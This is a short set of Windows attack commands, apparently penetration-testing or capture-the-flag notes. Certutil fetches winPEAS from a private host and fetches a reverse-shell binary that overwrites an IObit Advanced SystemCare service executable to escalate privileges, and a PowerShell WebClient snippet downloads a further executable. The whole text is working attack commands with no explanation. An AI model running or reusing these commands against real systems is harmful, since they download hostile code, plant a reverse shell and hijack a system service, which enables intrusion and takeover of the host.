
```sh
certutil -urlcache -split -f "http://10.18.21.236:8000/enum/winPEASany.exe" "C:\Users\bill\Desktop\winpeas.exe"
```

```sh
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```



```powershell
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.21.31.111/gatekeeper.exe","C:\tmp\gatekeeper.exe")
```